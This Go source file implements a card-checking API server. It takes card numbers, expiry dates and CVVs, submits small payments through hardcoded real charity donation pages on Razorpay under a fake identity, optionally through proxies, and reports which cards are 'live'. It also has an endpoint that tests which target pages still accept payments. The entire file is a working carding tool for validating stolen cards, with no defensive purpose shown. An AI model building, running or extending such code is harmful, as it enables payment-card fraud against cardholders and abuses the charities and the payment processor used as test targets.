package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"strconv"
	"sync"
	"time"
)

// defaultSites is the shared pool of Razorpay Pages used when no site is specified.
var defaultSites = []string{
	"https://pages.razorpay.com/pl_HB3M7WgxCaYkO2/view",
	"https://pages.razorpay.com/satgurucharity",
	"https://pages.razorpay.com/agape",
	"https://pages.razorpay.com/epdonation",
}

type APIResponse struct {
	CC       string `json:"cc"`
	Gateway  string `json:"Gateway"`
	Response string `json:"Response"`
	Price    string `json:"Price"`
	Currency string `json:"Currency"`
	Status   string `json:"Status"`
	Message  string `json:"Message"`
	Time     string `json:"Time"`
	Proxy    string `json:"Proxy"`
}

func main() {
	port := os.Getenv("RAZORPAY_PORT")
	if port == "" {
		port = "8086"
	}

	http.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{"status":"ok","service":"razorpay-pages-checker"}`))
	})

	http.HandleFunc("/shopify", checkHandler)   // backwards compat
	http.HandleFunc("/razorpay", checkHandler)
	http.HandleFunc("/sites", sitesListHandler)
	http.HandleFunc("/sites/test", sitesTestHandler)

	fmt.Printf("======================================================================\n")
	fmt.Printf("  Razorpay Pages API Server\n")
	fmt.Printf("======================================================================\n")
	fmt.Printf("  Listening on http://0.0.0.0:%s\n\n", port)
	fmt.Printf("  Endpoints:\n")
	fmt.Printf("    GET /razorpay?cc=...&site=...&proxy=...&amount=...\n")
	fmt.Printf("    GET /sites          - List all default sites\n")
	fmt.Printf("    GET /sites/test     - Live-test all default sites (no CC needed)\n")
	fmt.Printf("======================================================================\n")

	log.Fatal(http.ListenAndServe("0.0.0.0:"+port, nil))
}

func checkHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	startTime := time.Now()
	ccLine := r.URL.Query().Get("cc")
	siteURL := r.URL.Query().Get("site")
	proxyURL := r.URL.Query().Get("proxy")
	amountStr := r.URL.Query().Get("amount")

	// use package-level defaultSites pool

	if ccLine == "" {
		w.WriteHeader(http.StatusBadRequest)
		_, _ = w.Write([]byte(`{"error":"Missing cc parameter"}`))
		return
	}

	sitesToTry := defaultSites
	if siteURL != "" {
		sitesToTry = []string{siteURL}
	}

	// Default custom amount (INR)
	customAmount := 10
	if amountStr != "" {
		if val, err := strconv.Atoi(amountStr); err == nil && val > 0 {
			customAmount = val
		}
	}

	// Parse credit card details
	cardNo, expMonth, expYear, cvv, ok := parseCC(ccLine)
	if !ok {
		resp := APIResponse{
			CC:       ccLine,
			Gateway:  "Razorpay Pages",
			Response: "INVALID_CARD_DETAILS",
			Status:   "false",
			Message:  "Failed to parse credit card line",
			Time:     fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
			Proxy:    getProxyLabel(proxyURL),
		}
		jsonResp, _ := json.Marshal(resp)
		_, _ = w.Write(jsonResp)
		return
	}

	// Initialize HTTP Client
	client, err := newClient(proxyURL, 15*time.Second)
	if err != nil {
		resp := APIResponse{
			CC:       ccLine,
			Gateway:  "Razorpay Pages",
			Response: "PROXY_ERROR",
			Status:   "false",
			Message:  fmt.Sprintf("Failed to initialize proxy client: %v", err),
			Time:     fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
			Proxy:    getProxyLabel(proxyURL),
		}
		jsonResp, _ := json.Marshal(resp)
		_, _ = w.Write(jsonResp)
		return
	}

	var finalResp APIResponse
	var lastErr string

	for _, currentSite := range sitesToTry {
		session := &RazorpaySession{
			Client:       client,
			ProxyURL:     proxyURL,
			PageURL:      currentSite,
			CustomAmount: customAmount,
		}

		if err := session.ScrapePage(); err != nil {
			lastErr = fmt.Sprintf("Scrape failed on %s: %v", currentSite, err)
			continue
		}

		orderID, err := session.CreateOrder("Jane Doe", "janedoe@example.com", "9876543210")
		if err != nil {
			lastErr = fmt.Sprintf("Order creation failed on %s: %v", currentSite, err)
			continue
		}

		result, err := session.SubmitPayment(cardNo, expMonth, expYear, cvv, "Jane Doe", "janedoe@example.com", "+919876543210", orderID)
		if err != nil {
			lastErr = fmt.Sprintf("Payment submission error on %s: %v", currentSite, err)
			continue
		}

		if result.Status == "SiteError" && len(sitesToTry) > 1 {
			lastErr = fmt.Sprintf("Site error on %s: %s", currentSite, result.Message)
			continue
		}

		status := "false"
		switch result.Status {
		case "success", "3ds":
			status = "true"
		case "SiteError":
			status = "SiteError"
		}

		finalResp = APIResponse{
			CC:       ccLine,
			Gateway:  "Razorpay Pages",
			Response: result.Response,
			Price:    formatAmount(session.ItemAmount),
			Currency: session.Currency,
			Status:   status,
			Message:  result.Message,
			Time:     fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
			Proxy:    getProxyLabel(proxyURL),
		}

		jsonResp, _ := json.Marshal(finalResp)
		_, _ = w.Write(jsonResp)
		return
	}

	// If all sites failed
	finalResp = APIResponse{
		CC:       ccLine,
		Gateway:  "Razorpay Pages",
		Response: "SITE_ERROR",
		Status:   "SiteError",
		Message:  lastErr,
		Time:     fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
		Proxy:    getProxyLabel(proxyURL),
	}
	jsonResp, _ := json.Marshal(finalResp)
	_, _ = w.Write(jsonResp)
}

func getProxyLabel(proxyURL string) string {
	if proxyURL == "" {
		return "Direct"
	}
	return "Live"
}

// ─── /sites ──────────────────────────────────────────────────────────────────

// sitesListHandler returns the list of all default Razorpay pages.
func sitesListHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	type SiteList struct {
		Total int      `json:"total"`
		Sites []string `json:"sites"`
	}
	resp := SiteList{Total: len(defaultSites), Sites: defaultSites}
	jsonResp, _ := json.Marshal(resp)
	_, _ = w.Write(jsonResp)
}

// ─── /sites/test ─────────────────────────────────────────────────────────────

type SiteTestResult struct {
	Site    string `json:"site"`
	Status  string `json:"status"` // "live" | "dead"
	Message string `json:"message,omitempty"`
	Time    string `json:"time"`
}

type SitesTestResponse struct {
	Total    int              `json:"total"`
	Live     int              `json:"live"`
	Dead     int              `json:"dead"`
	Elapsed  string           `json:"elapsed"`
	Results  []SiteTestResult `json:"results"`
}

// sitesTestHandler tests every default Razorpay page concurrently by scraping it
// (no CC required). Returns which are live vs dead.
func sitesTestHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	proxyURL := r.URL.Query().Get("proxy")
	overall := time.Now()

	results := make([]SiteTestResult, len(defaultSites))
	var wg sync.WaitGroup

	for i, site := range defaultSites {
		wg.Add(1)
		go func(idx int, pageURL string) {
			defer wg.Done()
			start := time.Now()

			client, err := newClient(proxyURL, 12*time.Second)
			if err != nil {
				results[idx] = SiteTestResult{
					Site:    pageURL,
					Status:  "dead",
					Message: fmt.Sprintf("proxy error: %v", err),
					Time:    fmt.Sprintf("%.2fs", time.Since(start).Seconds()),
				}
				return
			}

			session := &RazorpaySession{
				Client:  client,
				PageURL: pageURL,
			}
			if err := session.ScrapePage(); err != nil {
				results[idx] = SiteTestResult{
					Site:    pageURL,
					Status:  "dead",
					Message: err.Error(),
					Time:    fmt.Sprintf("%.2fs", time.Since(start).Seconds()),
				}
				return
			}

			results[idx] = SiteTestResult{
				Site:   pageURL,
				Status: "live",
				Time:   fmt.Sprintf("%.2fs", time.Since(start).Seconds()),
			}
		}(i, site)
	}

	wg.Wait()

	live, dead := 0, 0
	for _, res := range results {
		if res.Status == "live" {
			live++
		} else {
			dead++
		}
	}

	finalResp := SitesTestResponse{
		Total:   len(defaultSites),
		Live:    live,
		Dead:    dead,
		Elapsed: fmt.Sprintf("%.2fs", time.Since(overall).Seconds()),
		Results: results,
	}
	jsonResp, _ := json.Marshal(finalResp)
	_, _ = w.Write(jsonResp)
}
